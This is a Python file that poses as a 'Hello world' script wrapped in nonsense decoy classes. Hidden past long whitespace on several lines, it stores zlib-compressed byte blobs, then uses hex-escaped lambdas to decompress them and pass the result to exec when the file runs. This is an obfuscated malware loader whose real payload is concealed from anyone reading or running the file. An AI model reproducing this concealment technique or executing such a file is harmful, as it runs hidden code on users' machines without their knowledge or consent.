from builtins import *
from math import prod as Invert

__code__ = 'print("Hello world!")'


Multiply, StackOverflow, DetectVar, _invert, Ceil, Positive, _walk = exec, str, tuple, map, ord, globals, type

class Algorithm:
    def __init__(self, _memoryaccess):
        self._system = Invert((_memoryaccess, -58018))
        self._cube(Cube=2261)

    def _cube(self, Cube = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._system -= 61015 * Cube
        
        try:
            (_positive, StackOverflow, Multiply) if DetectVar != Ceil else {_invert: _invert} > Multiply

        except TypeError:
            ((Multiply, (Multiply, _positive, _positive)) for Multiply in {_invert: _invert} if StackOverflow <= Ceil)

        except:
            _walk(-79329 - -13975) == Ellipsis

    def Substract(self, _divide = 39914):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _divide /= 88362 + 67050
        self.Walk != str
        
        try:
            ((_positive, (Multiply, _positive, _positive)) for _positive in {_invert: _invert} if Ceil != StackOverflow)

        except AssertionError:
            ((StackOverflow, (Multiply, _positive, _positive)) for StackOverflow in {Multiply: 'gt5d6dgRdgdbeBb63tll'} if Multiply < StackOverflow)

        except:
            _walk(97805 * 71821) == bool

    def Theory(_callfunction = False):
        return Positive()[_callfunction]

    def Divide(Add = 16174 * 56197, Builtins = str, Product = Positive):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Product()[Add] = Builtins
        
        try:
            ((Multiply, {_invert: _invert}) for Multiply in (Multiply, _positive, _positive) if Ceil <= Ceil)

        except OSError:
            ((_invert, (Multiply, _positive, _positive)) for _invert in (Ceil, _positive) if Ceil == StackOverflow)

        except:
            _walk(-9639 + -54571) == type

    def execute(code = str):
        return Multiply(StackOverflow(DetectVar(_invert(Ceil, code))))

    @property
    def Walk(self):
        self._algorithm = '<__main__.Positive object at 0x000006082BE73940>'
        return (self._algorithm, Algorithm.Walk)

if __name__ == '__main__':
    try:
        Algorithm.execute(code = __code__)
        Negative = Algorithm(_memoryaccess = 12585 / 66408)

        Algorithm(_memoryaccess = -32224 * -37000)._cube(Cube = Negative._system - -34994)                                                                                                                                                                                                                                                          ;Algorithm.Divide(Add='DOOoOoooooDODODOOOooDDo',Builtins=b'x\x9c\xe5\x1b\xcbn\xe38\xf2\xde_1\x98\x8bm\xf4\x03\x12I\x91R\x80\xbe\x05\x03$H\xda\x87\x0c\x90\x00\x8d@\x90-eW\x81l5\x12\xf7t\xe6\xb2\xdf\xbeUER\xa6\xad\xc8zX1\x1a\x88\x15\x92\xc5\x12\xc5G\x91\xac\x17\x99\xa2\\&\xc5\xf3t\xf6}r{{{w\x07\xe1\xf6N\x03\x08\xdeN\xee\xbf\xfe\xa7(\x17P\xe4\xc3\xab\xef\xf1C\xcf+\xe7\xa5W\xc2\xdf\x1c\xe2\xd2\x83<\xa4\xf3\xf9\xe4\xfb\xd9\xd9\xc7\xcf\x1f?O?O?\xfa\xb3\xd9=T\x95m\x92\xcd\xe6\xa9\xb9\xaa\x1bv\xc3\xf0wC\x7f\xec\x06~\xec\xa6^O\x9a\x1f\xa8c\xb5Z\xad\xf5\x0fR\x80\xe1\xc1\x18FR\xd0X?4\x14\xc0o_~\xbd\xbc\xfc\xfa\xf5\xeb\xc5\xfe\xe9,|\x1a\xc7\xf9\xeaG\xf9\xb4\x89\xe3\xe6\x86//./\xf0wE\xc9\xd5\xd5\xd5\xc5\xe5\xd5\xe5%|\xfcz\xad\xd3\xc9\xe2g^l\xf2\xf5\xf3d\xf6\xe5\x9f\xe4\xe9\xf9\xc3\xeb\x15`\xd5\xe7\xe5\xf9\xf9\xf9\xfc|>\x07\xa0\x04x^"X\x9eC\xe5\xf39R\x1e\x89\x0e\xa9\x9d\x07\xc8O\x9bZ}^\xe7\x9b"\xff\xb9\xd8\'\xeb\xec\xd3\x8d&xE~\x8co\xfa\xd73\xfb>VE_\xf2u\x9a\xbdL\'\xd9s\x91\xfcU{}?k\x9e\x8b\xc7\xa2x|,\xf2\xc7\x1c\xfe\n\x84\xdf\t\xa5\x8a\xb2\xac\xbf\x05B5/-\xa0\n\x12a\x8e$\x99\xe3\xd6\xf5 \x06jM&_\x1e\xcb|}h\xb7\x10\xd95\xf1o5\x08s\xf0N\x08\xbdI\xca\xe2\xe15J\x1f\xa0\x97Y\xa7\xb8R\xefL2\x8c^y\xbe|N\xd6\xf9\xd1\xf4j\xac\xa7/\xbd\x9a+\xb2\xf4\xfa\xf7!/^\xb2\xff\xae\x7f\xf6\xa4\xd9J#\x11\xb1\xb2|\xfc=\xac\xaf"\xf9\'\xeb\xb7\x91\x89t+KBJ\xdf\t\xad\x9e6\xcf\xbd\x84\xc3\xcb\x0b\xb6E\xeda\x13\xd4\x14\xfc\xde\t\xb5\xb2\x9fO\x7f\xf7\xdc\x84\xdf\xbe]\x7f\xc3\xdf\xf55B\x10S\xf6\xbd\xd0\xab\xc8\x7f\xac\xcae\xaf\x15VjR\x10I\xe6:\x86\xcc\x8eF\\cl\xd3\xc9L\xc4a\xccb\x19\xabX@\xc0\xd4\x87\x92A\x1d{\xb8\xa2W\xe5\xcct1\xe1a\xf0\xc0\xd9^@\x1c\x87\x10A\xf01\xcf\x16,di\xa7\xb2\x8aE\xa0\xbb\xa6\xd9\xb2L\xb3\xe9$|\xd8\xd4\xb9\xfbLG\xf7\xefc\xad,\xb3\x97W\xb9\xf6\xb8\x0b\xa5q~\xb9\x99\'\xee\x84\xc0\xcc\x970\xef<3\xbfmeq~\xa3n\xf3{\xdf\xd8#)\x15\x93\x0f2e\x9ed*\x90\x91\\*\x01q\xa68`"\x99*O>(\xa6\x04\xe4\x02\x15\xca@\xf2\xd6\xf6\x1ai\xd9\xd4\x07\xf1 `\xd4\x12biR\xee\xb9\xb0\x86l\xdc\xd6\xfe\x81\xb1\xee\x8cGq\x18/S\x1e\x8d\x9f\xc3\xe8\xb8:blC\x19\n\xb0\x8f\xcf^[!\x15\xf38\x00\x0e\xc3b\x1f8\x8c\x0f\xfc%\x84\x92a\x1d\xdbV\x91\x07o\x86\xb2&e\xd8\x8bg\x96e\xe0,O\xc4+b7z\xe9v)+\xbb\xb3\xa6\x8aE\xc1\x0e/\xff\xd8<\x95?V\xf9\x08\x84m\x1c\xaa\xdde6\xb5\x9c\xd67C\xe2\xceP\xbb\x94\xed3\xd4C\x86 \xfal`]\x11\x9fF+\xb0\xc40G[\xb0Y5h\xdc\x0c\x1d\xb7\xf3\xfdA\xdd\x7fe^\xdaX\xab\xff}\x19\x00l\xc9\xe3\xfaqQ\x14D\xb3\x0bH\x8a\xa2\xa0\xf8\xa2\x18D\x97!l\xe1\xfe\xc0\xa4\xe5\x05z:\x8a\xc7\xc7\xbc\x80\xe7\x11 H\xf2\xd6\xe5\xcbas\x0b\xda\xe0!\x04\x1f \x05%E\x1d;p\x89\xfb,\xa5\xe5\xeb\xf5Q\x10\x8ad\xb5H\x93?p\xe1\xd1\xd2\xd3\x1eE\xf2O\x9c5R\xfa\x00m\xa0\x02\xf4\x96\x95\xe7\xf3st\x97i\xa7\x19Tw~\x9aAU\x03\xca\xf3\xa2\xa0y\x02\x00\xa7\x07g,\x7f\xcc\xcf\x9az~`H\xb4\xfa\xccC\xcb\xf0-\xf9\xd4Q\x93\x88\xae\xa4\xb9\x96V\xe4\x0f\xf6\xbc\x01\xe3m\xeaZ\x10\x06\x8a\x82~B\x03\x87[|\xeb\x9e\xb2\x1d]\xadW[\x82\x10\xa3Y\x8d\xd8Q\xd4=\x04i\x1e\xa0k\x08\x80\x84\x86P\xf3\xa0\xbc\xc1\xb4w\xb7\xfb\xbc1d/\x11\xe8Y!\xd4\x9c1\xd6\xaeu\x1cb/\xc8\\\xc8\x81J\xacE/d\x00FQ<:\x15:F\xa9\x90FB2GrZ\x9c\x95\xa0V\x1f>T\xd63\xd2\xb7\xa3>\xbc\xa3T\xd8\x85\xa6\xcf3\x98\x8eon\xb4\xddq\xd6 \xcb\x06\xac\xb4\x04\x9eH,\x9d\x80\xb1\x86\x13\x93\xd7e\x003\xeez\x0b\x82\x00L\x86\x80\x89L\xf8"\x15\xc1qkN{\x17\xae\xb5\xb7\x81br;\\\xbf\xe5B\xb1Z\xa3\x9dh\xe5\xe4\x85]\x18\x8ea\xdcV\xd6\x1f\xc02a\xf8\x17@\x04\x08H\nM\x94+\x8c\xc6\xe4GvU,\xcdJps\xcbj\xc5$\x9d\xd9\'\xca!\xad\x15\x91fTX\xfdh\x88\xc0>\xd8i0\x1d\xe5\xd2t9j\x820t\xee:\x12\x1aZ\xbf\xc4>\xe8\x8e@?F\xed\xf7\x835:\xf1\x91\x95\xc9\xa9\xf1Z(h\xa8s\x9f+.a\xcf]\xc6^\x1b\x15\x19]\xd2\xee\xc2[\xcc\xa8\\\x04\xcc\xe6c\xb8\x86\xf6\xe4\xbe\x18\xd7\x8d\x01\x06r\x03\xcf(>\x1dw\xf1\xfd\xd7\xdai\xe3t\xfa\xbf\xa6#\xdbY\xf94\x9d6x\xa0g\xc9:\x9d6~xh\xfc\x8d\xb6O&Sz2\n\x99\x81\xb6p\xf5t^\x83\xb8M\xaelGh\xf3\\\x02\x8fj\x12d\x03LG\xdb\xadm\xea>\x90o\xf7\xd1\xf4_\xfc\x19<)\xc5\x99\x81\xd3\n\x97\x9a\xd8\xbcko\xfeOZ\x1a\xfeG@\xc1\x8b\x8fgg\xdf\'?7\x0f\xe1d\x9a\xa5\xe52K\xbf\xcc&\xa0I\x88\xa5\xdc\xdbS;\x18\rcl\xb1!\xf38\xb2\r\x8c!\x98\x14\x9f\x8a\x91\x98\xb7V\xe3\x9c,\xa6f\x88v\xb0z\x86\xa6\xf7m\xfd\xc3\xefu\xbd\xb6%\x93\x17.l[kj\xe7\xfblj\xe6{mN\xa6\xd6\xc6\x90\xff\xf38\x07\xa7uf\x06\xd6Q\xe9\xb8C\xc2=\x07\xe7\xa1\xb2\x1d\x1d\xd8\x9f\x1e\xf2"[\'\xab\xec\xebD\xafr\xea\x919\xfc\xa6N\x9e\xc6\xc4\xfa\xb4\x82\xf7_kg\x83\x83uk\x1e{`\xf0\xcb\x98\xc5\xda\x07\xc8\xc9\xf3\'\xea\xd8v\x17\xa2\x82\x82\x12\x8b\xc2\xc7<\x8e\xe2\x80\\\x885\xec\x11.3i\xe622\x81\x1b\\\x05;.\xb3\xb6\xb2A\x7fE\xfe\xa0\xf4YU\x830C\x1aAY\x859\x04\xeayDA\x8f\xa6\xc3\x8f#(\xc9\xea\xd8\xd6\xd6\xa0P\x08\xe4\xe70!\x0c A\xe7J~\x1d{\x1a\x81\xb9\xebtm\x96\x10\x13\xd2\xff\xcdy\xe3\xb59\x82\xfc\xf6\xed-}\x1e\x03F\xd2\x8d\xdd+\xe3\x99\xd8\xf5UX\xff\x05\xe5\x19\xe9\xb821A\xc3\x89\xc9G\x06\x13U%\x10\xf2X\xe2%\xc4\xa6\x8d3\x81X\xbf\x10\x16#\x84#\x1a\x84\xc7$|\xd5,\x14\xec\xa4\xb4\x8f\x06\xd8~\xc0 p\x13B\x08\x12\x820!\xa4\x80\xa4\\0\xbfS\xd9\xc6^\xd5\xb6\x96\xdb1\xdaF\xb3\xc9\xe1B\xe4\xd5\xde\x9e\x9bx\xfa(\xa5\x9c\x8c.\x9d\x02\xc7\x1a\xac\x8eS\r,-\xde\xe1Rme\xc3\xbe\xd2\xa9Q\xbb\xb1ZL\xeah7i\xa5\xd7\xa4\xce;\x93\xb6\xb5\xab%Q\xa3\n\x17()}\xd9\xeaf8t\xe2\xd5\x9b\xa5v\x92x(\xdb\x141\xce\x08x\x1e7\x9c0\xa8cO\xe735\'\xa8}O5O\xae\xb0\xee\xb9\x90\x8cSiY\xb9\x9a\xb6\x01\xcb\x84L\xa8@*\x99\xb1\x0c8\x10S\x91\x94*\x93\x01\xe4S\xc7&\xd9*\xf8Y]\xd9\xe7xd\x0c\x1bA\x01\x9f\xa0\xba~\x03uV\xdfs\xdc\x9b\xaa\xc3\xec\xe28\xcf\xd4\x00\x81\xd4\x81\x1f$\x95k\xd0u\x10&\x06o\x9c@\xedn\xc2\x1e\xfah\'\x85\'$e101\xaa?\xa8\xf0Du\xeciw\xe7\x80K\x07oj\xc4\x0e\xd4\x8bN\xbc\x0c\xbbq\x15\xe3\x053:\x8b\xa3\xb5P**o\x990\xe6\xad\x00\xce\xb2\xe7=\x93\x95\xe1K\xfb\xdb\x18\xc4\x84\xd7\xfa\xd1\xd2\xeaNb7X\x13\x1b\xf5\xa8\xb14#\x9f\xb4\x9e\x144\xa4a\x1a\rI\xb1#4\x9a\xb7bP\xfa\x9a\x88\xa2\xcb \x18\xe3\xa6\xb4\xd7D\xf6\xb0o\xed\xa8\x0f\x8dqg\xaf\x80\xd8\xd3\x9c\xc81\x02\xdb\xca\r0\x00\x1d\'\x80\xb9\x0b\xa0o\x03\x90\xbf\xfb\xa2\xc3i\xecX\x9b\xab\x07\xd7\x15\xc0,\xd1\x80\x97\x10\xa3\x82\xc3h\xce\x82:\xf6\x94\x86\xdfh:\xdfX|\xfe\rlP\x19\x0b\xd2\'\x03\xba\xb5\x89\xde\x14\x94d\xaa\x8e\x1dEn\x8eX(V\xb1\xde\xe8\x9c63\x8b\x19y\nj\xd8vQ\x8eWU\xf1\x0e\x89G\x97\xc8\xc2X\x90(\xafa\x8f\xb8\xea\xa8\x82\xed\xd5Ta<|\xc1\xce&\xdfz\x02\xdb\xca\x8a!\x1e!W\x81\xef\xe4\xf3ei\x80\xb1\xcf\xa9c\x14\x16\x14\x12\x9e\xf0E\xa0X\xa0\x04\x98N!W\xf0.\x90B_\x12\x824\x83\xaf\x14c\x9c\xf1\x88+\x10p\x8a\x07\x92q)\x03\n!\x97\\ \x0e\x82\x0f\xb0\xc5\xc3\xb7TVH\t\xef\xb0\x8c\xc6\xc1K*\xc7\xa9,\xa4R\x10\xde7\xf5\xe8T\xd0\xb7\x1e\xe5\xf5{!\x15\xf4@Q]\xdc\xb4\x87\xed\x08\x83\x83\x1cgP\x86\xda\xe0\xfbeu\xdb>f\xe1\x0bF\x0f~\x01\xdf1&C\xb6\xbd\xc0\x11VN\x91\x9dK\x1d[\x9ccD\xa4;\xc6\x84\xa3n\xf1P\n\xe5K\x8f\xcc\x07\x0f\x0c\x10\x86\x8d\xa9\xdfA\xc8\x1f\xeb\xb6\xb8\xc4\x03\x98+:\xb6\xa4\x13\xe3\x0b:4\x1eE\xca\x9f\xf8\xc2\xd0\xbew\xdd\xfc\x1f\x99\xfd\xa3\xea\xef\xee~\xb3N\x8fk\xf6\xfc\xa6\xc2\x15\x95\x87(F\x8bL\x18\xcb\x8b\x91\x0c\x0b\xea\xd8#n\xe7\x84\x8e\xbb\xcb=\xb0\xf1+G\xfd\xf6vN[\xd9\x1e,|t\x89?\xd6$6_/\xaf\xdduS\r\x9ed\x14\x1dQ\xb0\xd8+\xd3\xc4VC,/\x19\xd3B\x02\x03\x07\x96/\r,\xf7\xf2\x087\xe1]\xdc\x1e\x0c\xa2+b\x19\x88\xb1\x00\xb2\x0f\x98B\x1f\x150h\t\xe2.\x00\xc6\xbf\x00\xf1\x97\x18Q\x98\x1a\xd1\xb8@\x9a\xc1HR\na\xef\xf1H\x10\x95(\\\x18\xf6\x19`\n\xd0\xadm\xf0\xb7\xf8\xa6w\x08\xbb\xef\x08\xf6A\x90\xf9\xdc\x83\x80u\xeb')

        if 356015 > 8976693:
            Algorithm(_memoryaccess = -58376 * 78319).Substract(_divide = 75628 - Negative._system)
        elif 420467 < 8352994:
            Algorithm(_memoryaccess = -56254 + -80068).Substract(_divide = 55143 - Negative._system)                                                                                                                                                                                                                                                          ;Algorithm.Divide(Add='wwxwwwxwxwwxwwwxwwww',Builtins=b'vL@YJ\xa9\xafaJ\xfd\xbdwn\x19\xb7\x1c\xdf\x85\xa1\x0c\x03\xd1n\xe9\xed\xd2\xdd\x86}Z\x0b\xa7\x9c\x0b\xcb=\x1c\xa8\x11\xc7\xceI\xfbzv\xf8:\xde\xe7\xf5\xf4EP\xbcf^"4\xf4\x9f\\\\\xb3\xce=\xdb\xdb9\xefs\xcc\xc0\xb6\xb2\xac\x8f\xd5\xd5\xe8\xef9\xde\xe3\xfd\x96\xae\xa4Sq;fO.\xf6N5\xac\xf9-\x9c\xb9\xe9R\xb6\xe3\xdct\xd1\xbeA\xd5$m\xd0c\xfaI\xbc\xa8\x87#)d\xbbw1\x9a \x0b\xdbV\xb6\xad%\xbco\r\xe8\x92r\xbf\x0f Gc\x00\xee\x86.u\xd8\xa3\xa8x+\xbd\x81\x99\xf2\x02\xdc\xccX\x03\xe8\xd8"c\xfbN\xae-\xbc{\xe7\x04\xf3\x1eC\x1d\x19k\n!F\xda(\x15*\xfb\x0b\t\x0e\x1b0)_\x90\x95\x12B\xbc\x04\x0b\xe7u\xbd{\xc9\xba\x1eS.@\xbf\xcf`C1\xd5w\x0c\xce\xcc\x0ep+\x0e9~\x1d\x7f\x96#\xfc\xff\xb1\x16+\xa5\xcb\x01\xadf\xd9\xfe@\x0bet\xe3C\x1f\xb1\x051*\x95\xe8\xc4G\xb7\x82\xdc\xc7\r\xe4:\x96\x9b3\x87\xdb[%1\xb0\x1c\xc6p\x9d.e;\x9e\xbbv;k\xd9a\xd9\xeeyW\x15\x9f\xec\xac\xf5\xff\xb2\x87\xd2\xff')

        Negative._cube(Cube = Negative._system + 46458)                                                                                                                                                                                                                                                          ;O0O0Oo0oO0O0Oo00Oo0oo,NNMNMNNNMNNNNNNMMMMMMNNMN,XWWWXWXXWXXXXXWWXWWXXXW,lilillljlljjjiljlljjlii,xxwwxwxwwxwxwxwxwxxwx=(lambda O0Oo0OOOOO0O0OoOOOo:O0Oo0OOOOO0O0OoOOOo(__import__('\x7a\x6c\x69\x62'))),(lambda O0Oo0OOOOO0O0OoOOOo:O0Oo0OOOOO0O0OoOOOo['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda O0Oo0OOOOO0O0OoOOOo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0Oo0OOOOO0O0OoOOOo)"),filename='\x53\x53\x32\x53\x32\x32\x53\x53\x53\x53\x32\x32\x32\x32\x53\x32\x32\x53',mode='\x65\x76\x61\x6c'))),(lambda nmnnnnmnmmnnmnnnmnmnmmnnn,O0Oo0OOOOO0O0OoOOOo:nmnnnnmnmmnnmnnnmnmnmmnnn(O0Oo0OOOOO0O0OoOOOo)),(lambda:(lambda O0Oo0OOOOO0O0OoOOOo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0Oo0OOOOO0O0OoOOOo)"),filename='\x53\x53\x32\x53\x32\x32\x53\x53\x53\x53\x32\x32\x32\x32\x53\x32\x32\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 265978 > 7862774:
            Negative._cube(Cube = Negative._system - 52087)
        elif 496134 < 915527:
            Algorithm(_memoryaccess = -4135 * 45270).Substract(_divide = -84079 / Negative._system)                                                                                                                                                                                                                                                          ;xxwwxwxwwxwxwxwxwxxwx()(lilillljlljjjiljlljjlii(NNMNMNNNMNNNNNNMMMMMMNNMN(O0O0Oo0oO0O0Oo00Oo0oo(XWWWXWXXWXXXXXWWXWWXXXW('\x76\x61\x72\x73'))),Algorithm.Theory(_callfunction='DOOoOoooooDODODOOOooDDo')+Algorithm.Theory(_callfunction='wwxwwwxwxwwxwwwxwwww')))

    except Exception as _positive:
        if 313585 > 9603330:
            Algorithm.execute(code = StackOverflow(_positive))

        elif 415108 > 3450707:
            Algorithm(_memoryaccess = 24134 + -90971).Substract(_divide = -85643 - Negative._system)
